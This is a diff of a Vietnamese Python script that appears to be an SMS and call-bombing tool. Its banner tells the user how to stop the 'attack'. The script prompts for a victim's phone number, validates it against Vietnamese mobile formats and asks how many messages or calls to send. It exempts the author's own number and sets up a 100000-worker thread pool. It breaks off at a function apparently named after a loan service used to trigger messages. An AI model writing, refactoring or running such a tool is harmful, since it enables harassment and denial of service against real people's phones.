@@ -1,26 +1,18 @@
 import os
-import requests,os,time,re,json,uuid,random,sys
-api_fb()
-vLongzZ()
-vLongzZz()
-vanlongzZ()
-vanlongzZz()
-api_fb()
-api_cookie()
-api_tds()
-api_like()
-api_camxuc()
+import time
+import re
+import sys
 from concurrent.futures import ThreadPoolExecutor
-banner = """
-
+# Define the banner text
+banner_text = """
 \033[1;39m        ██╗░░██╗░░░░░░████████╗░█████╗░░█████╗░██╗░░░░░
 \033[1;39m        ██║░██╔╝░░░░░░╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
 \033[1;39m        █████═╝░█████╗░░░██║░░░██║░░██║██║░░██║██║░░░░░
-  \033[1;39m      ██╔═██╗░╚════╝░░░██║░░░██║░░██║██║░░██║██║░░░░░
+\033[1;39m        ██╔═██╗░╚════╝░░░██║░░░██║░░██║██║░░██║██║░░░░░
 \033[1;39m        ██║░╚██╗░░░░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗
 \033[1;39m        ╚═╝░░╚═╝░░░░░░░░░╚═╝░░░░╚════╝░╚════╝░╚══════╝
-  \033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  \033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;39m             ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ╔══════════════════════════════════════════════════════════╗
 ║ ~[⟨⟩] ➩ ADMIN:       ANH KHOA                            ║
 ║ ~[⟨⟩] ➩ FACEBOOK:    VƯƠNG QUỐC ANH KHOA                 ║
@@ -34,24 +26,28 @@ banner = """
   • Để dừng tấn công bấm [ CTRL + c ] 2 lần
   • Khi chạy tool máy sẽ có cảm giác lag !!!
 \033[1;31m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 """
-def banner():
-  os.system("clear")
-  for h in ban:
-    sys.stdout.write(h)
-    sys.stdout.flush()
-    time.sleep(0.0003)   
-banner()
-amount = 5000
-sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
-while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
-  print("⚜ Sai Định Dạng !!")
-  sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
-count = int(input("[ + ] Số Tin Nhắn / Call [ Nên Để 200 ]: "))
-if sdt == "0965403749":
-  print("SỐ ADM SPAM CÁI GÌ :)) ")
-  exit()
+
+# Function to display the banner
+def display_banner():
+    os.system("clear")
+    for h in banner_text:
+        sys.stdout.write(h)
+        sys.stdout.flush()
+        time.sleep(0.0003)
+
+# Main script execution
+if __name__ == "__main__":
+    display_banner()
+    sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
+    while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", sdt):
+        print("⚜ Sai Định Dạng !!")
+        sdt = input("[ + ] Nhập Số Điện Thoại Victim: ")
+    count = int(input("[ + ] Số Tin Nhắn / Call [ Nên Để 200 ]: "))
+    if sdt == "0965403749":
+        print("SỐ ADM SPAM CÁI GÌ :)) ")
+        exit()
+
 
 threading = ThreadPoolExecutor(max_workers=int(100000))  
 def vayvnd(sdt):
